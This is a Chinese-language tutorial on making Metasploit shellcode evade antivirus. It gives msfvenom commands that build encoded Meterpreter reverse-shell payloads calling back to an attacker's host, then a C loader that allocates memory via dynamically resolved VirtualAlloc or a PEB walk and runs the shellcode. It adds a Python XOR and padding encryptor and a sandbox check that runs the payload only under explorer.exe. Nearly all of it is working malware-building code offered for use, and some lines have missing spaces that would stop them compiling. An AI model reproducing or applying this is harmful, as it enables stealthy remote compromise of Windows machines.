#### 0×1 shellcode动态加载
```
> msfvenom -p windows/meterpreter/reverse_http-e x86/shikata_ga_nai -i 12 -b '\x00' LHOST=[your remote ip addres] LPORT=[listeningport] -f c >hacker.c
> msfvenom -p windows/meterpreter/reverse_tcp-e x86/shikata_ga_nai -i 12 -b '\x00' LHOST=[your remote ip addres]LPORT=[listening port] -f c >hacker.c
> msfvenom -p windows/meterpreter/reverse_tcp_rc4-e x86/shikata_ga_nai -i 12 -b '\x00' LHOST=[your remote ip addres]LPORT=[listening port] -f c >hacker.c
```

#### 0×2 敏感API动态调用
有一些杀软会对 IAT（ Import AddressTable ，即导入地址表，顾名思义， iat 表中存放着程序中调用的来自外部动态链接库的函数地址）表中的一些敏感函数做检查
```
HMODULE hModule = LoadLibrary(_T("Kernel32.dll"));
HANDLE shellcode_handler;
FARPROC Address = GetProcAddress(hModule,"VirtualAlloc");//拿到virtualalloc的地址

_asm {
  push 40h  //push传参
  push 1000h
  push 29Ah
  push 0
  call Address  //函数调用
  movshellcode_handler, eax
}

memcpy(shellcode_handler, newshellcode,sizeof newshellcode);
((void(*)())shellcode_handler)();
```
获取kernel32.dll库地址并不一定要通过loadLibrary的，也可以从PEB中进行获取的
```
_asm {
    mov esi, fs:[0x30]      // 得到PEB地址
    mov esi, [esi + 0xc]    // 指向PEB_LDR_DATA结构的首地址
    mov esi, [esi + 0x1c]   // 一个双向链表的地址
    mov esi, [esi]          // 得到第二个条目kernelBase的链表
    mov esi, [esi]          // 得到第三个条目kernel32链表（win10）
    mov esi, [esi + 0x8]    // kernel32.dll地址
    mov hModule, esi
}
```
```
_asm {
  mov esi, fs:[0x30]  // 得到PEB地址
  NOP
  NOP
  NOP
  NOP
  NOP
  mov esi, [esi + 0xc]//指向PEB_LDR_DATA结构的首地址
  NOP
  NOP
  NOP
  NOP
  mov esi, [esi + 0x1c]//一个双向链表的地址
  NOP
  NOP
  NOP
  NOP
  mov esi, [esi]//得到第二个条目kernelBase的链表
  NOP
  NOP
  NOP
  mov esi, [esi]//得到第三个条目kernel32链表（win10）
  NOP
  NOP
  mov esi, [esi + 0x8] //kernel32.dll地址
  NOP
  NOP
  mov hModule, esi
}
```

#### 0×3 shellcode加密
免杀效果好不好，最主要的是就是 shellcode 的加密了
```
def generate_payload (shellcode):
       ba = bytearray (shellcode)
       newshellcode = []
       res = ''
       for b in ba:
              nchar = "\\"
              b = b^113^0x77
              b = hex(b)
              
              for i in range(1,len(b)):
                     nchar=nchar+b[i]

              res = res + nchar
              newshellcode.append(nchar)

       trash="\\x00"

       nnshellcode=[]

       for i in range(4 * len(newshellcode)):

                     if i%4==0: #ou
                         nnshellcode.append(newshellcode[int(i/4)])
                     else:
                         nnshellcode.append(trash)
       fres = ''
       for i in nnshellcode:
              fres=fres+i
       print(fres)
```

#### 0×4 虚拟机反调试
如果一个程序的父进程不是explor，那么我们就可以认为他是由沙箱启动的
```
DWORD get_parent_processid(DWORD pid) {
       DWORDParentProcessID = -1;
       PROCESSENTRY32pe;
       HANDLEhkz;
       HMODULEhModule = LoadLibrary(_T("Kernel32.dll"));
       FARPROCAddress = GetProcAddress(hModule, "CreateToolhelp32Snapshot");

       if (Address == NULL) {
              OutputDebugString(_T("GetProc error"));
              return -1;
       }

       _asm {
              push0
              push2
              callAddress
              movhkz, eax
       }

       pe.dwSize = sizeof(PROCESSENTRY32);

       if (Process32First(hkz, &pe)) {
              do {
                     if(pe.th32ProcessID == pid) {
                            ParentProcessID= pe.th32ParentProcessID;
                            break;
                     }

              } while (Process32Next(hkz, &pe));

       }

       returnParentProcessID;
}

DWORD get_explorer_processid() {
       DWORDexplorer_id = -1;
       PROCESSENTRY32pe;
       HANDLEhkz;
       HMODULEhModule = LoadLibrary(_T("Kernel32.dll"));

       if (hModule == NULL) {
              OutputDebugString(_T("Loaddll error"));
              return-1;
       }

       FARPROCAddress = GetProcAddress(hModule, "CreateToolhelp32Snapshot");

       if (Address == NULL) {

              OutputDebugString(_T("GetProc error"));
              return-1;

       }

       _asm {

              push0

              push2

              callAddress

              movhkz, eax

       }
       
       pe.dwSize= sizeof(PROCESSENTRY32);

       if (Process32First(hkz, &pe)) {

              do {

                     if (_stricmp(pe.szExeFile, "explorer.exe") == 0) {

                            explorer_id= pe.th32ProcessID;

                            break;

                     }

              } while (Process32Next(hkz, &pe));

       }

       returnexplorer_id;

}

void domain () {
       DWORDexplorer_id = get_explorer_processid();
       DWORDparent_id = get_parent_processid(GetCurrentProcessId());
       
       // 判断父进程id是否和explorer进程id相同
       if (explorer_id == parent_id) {
              dowork();
       } else {
              exit(1);
       }
}
```
